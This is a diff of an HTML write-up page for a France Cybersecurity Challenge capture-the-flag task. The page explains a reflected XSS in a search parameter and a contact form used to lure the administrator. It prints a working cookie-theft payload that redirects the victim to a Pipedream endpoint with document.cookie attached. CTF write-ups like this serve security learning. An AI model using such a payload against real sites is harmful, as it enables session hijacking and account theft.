@@ -68,8 +68,13 @@
                             </div>
                             <img src="img/randomsearch/xss.jpg" class="img-fluid" width="800">
                             The URL : http://challenges2.france-cybersecurity-challenge.fr:5001/index.php?search=%3Cscript%3Ealert%28%22nul%22%29%3C%2Fscript%3E <br>
-                            We see that the parameter search contain what we have put in the search bar. Therefore, if we modify the value of the search parameter by some javascript to redirect the administrator to a webpage that we control, we might retrieve the administrator cookie if click on the URL. <br>
-                            <strong>Document.location</strong>Document.location is a JavaScript function that allows to redirect any user to redirect to any link. Let's redirect to my Pipedream endpoint and add the cookie of the administrator as the value of the cookie parameter with <strong>document.cookie</strong>.
+                            We see that the parameter search contains what we have put in the search bar. <br>
+                            <br>
+                            Let's check what we have in the contact tab. 
+                            The contact tab displays another form, where you should enter a URL related to a search issue.
+                            <img src="img/randomsearch/contact.jpg" class="img-fluid" width="700">
+                            Therefore, if we modify the value of the search parameter by some JavaScript to redirect the administrator to a webpage that we control, we might retrieve the administrator cookie if the administrator clicks on the link that we will send through the contact form.<br>
+                            <strong>Document.location</strong> is a JavaScript function that allows to redirect any user to any link. Let's redirect the administrator to my Pipedream endpoint and add the cookie of the administrator as the value of the cookie parameter with <strong>document.cookie</strong>.
                             <div class="squarebox">http://challenges2.france-cybersecurity-challenge.fr:5001/index.php?search=&ltscript&gtdocument.location="https://96b66fa2d1f9a9492c5c3c21bfceece4.m.pipedream.net?cookie="+document.cookie;&lt/script&gt</div>
                             <img src="img/randomsearch/flag.jpg" class="img-fluid" width="700">
                         </p>
